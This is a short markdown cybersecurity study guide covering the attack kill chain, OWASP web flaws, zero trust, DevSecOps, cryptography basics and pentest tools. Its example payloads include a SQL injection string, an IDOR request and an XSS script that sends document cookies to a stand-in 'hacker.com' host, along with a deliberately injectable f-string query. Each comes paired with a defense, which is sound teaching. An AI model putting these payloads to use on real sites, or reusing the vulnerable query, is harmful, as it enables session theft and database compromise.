# 🛡️ CYBERSECURITY: OFFENSIVE & DEFENSIVE (GOD-TIER)

> [!CAUTION]
> This guide is for educational and defensive purposes only. Understanding how attacks work is critical for building secure systems. **"To catch a thief, you must think like one."**

---

## 🏗️ 1. ARCHITECTURE OF AN ATTACK (Cyber Kill Chain)

1.  **Reconnaissance**: Gathering info on target (OSINT, Nmap).
2.  **Weaponization**: Creating an exploit (Payload, Malware).
3.  **Delivery**: Sending the weapon (Phishing, USB, Exploit).
4.  **Exploitation**: Triggering the vulnerability (Buffer Overflow, SQLi).
5.  **Installation**: Gaining persistence (Backdoor, Rootkit).
6.  **Command & Control (C2)**: External control of the system.
7.  **Actions on Objectives**: Stealing data, Ransomware.

---

## 💣 2. OFFENSIVE SECURITY (The "Hack")

### 2.1 Web Vulnerabilities (OWASP Top 10)

- **SQL Injection (SQLi)**: Injecting malicious SQL into input fields.
  - _Attack_: `' OR '1'='1' --`
  - _Defense_: **Always** use Parameterized Queries (Django ORM handles this).
- **Cross-Site Scripting (XSS)**: Injecting JavaScript into pages.
  - _Attack_: `<script>fetch('hacker.com?cookie='+document.cookie)</script>`
  - _Defense_: Escape HTML output, use **Content Security Policy (CSP)**.
- **Insecure Direct Object Reference (IDOR)**: Changing IDs in URLs to access others' data.
  - _Attack_: `GET /api/user/123` -> `GET /api/user/124`
  - _Defense_: Always verify ownership in the backend.

### 2.2 Infrastructure Attacks

- **Brute Force**: Trying every password.
  - _Defense_: Rate Limiting, Account Lockout, 2FA.
- **DDoS**: Overwhelming the server with traffic.
  - _Defense_: CDN (Cloudflare), WAF, Rate Limiting.

---

## 🛡️ 3. DEFENSIVE SECURITY (The "Shield")

### 3.1 Zero Trust Architecture

**"Never trust, always verify."**

- Authenticate and authorize every request, no matter where it comes from.
- Micro-segmentation: Breaking the network into small isolated zones.

### 3.2 DevSecOps (Shift Left)

Integrating security into the CI/CD pipeline.

- **SAST**: Static analysis of source code (Snyk).
- **SCA**: Checking dependencies for vulnerabilities.
- **DAST**: Scanning the running app for vulnerabilities.

### 3.3 Cryptography Essentials

- **Hashing**: One-way (Passwords should be hashed with Argon2/BCrypt).
- **Encryption**: Two-way (AES-256 for data at rest).
- **Asymmetric**: RSA/ECC for SSL/TLS certificates.

---

## 🕶️ 4. PENETRATION TESTING TOOLS

| Tool           | Purpose                                         |
| :------------- | :---------------------------------------------- |
| **Nmap**       | Network scanning & host discovery               |
| **Burp Suite** | Web proxy for intercepting/modifying requests   |
| **Metasploit** | Framework for developing and executing exploits |
| **Wireshark**  | Packet analyzer (Network traffic)               |
| **Hashcat**    | Password cracking                               |

---

## 🎓 CHALLENGE: SECURE THIS ENDPOINT

**Vulnerable Code:**

```python
def get_user(request):
   user_id = request.GET.get('id')
   query = f"SELECT * FROM users WHERE id = {user_id}"
   # Bad! String interpolation leads to SQLi.
```

**Secure Code:**

```python
def get_user(request):
   user_id = request.GET.get('id')
   user = User.objects.get(id=user_id)
   # Good! Django ORM uses parameterized queries.
```

---

## 🚀 NEXT LEVEL: RED TEAMING

Emulating complex Advanced Persistent Threats (APTs) to test an organization's detection and response capabilities.
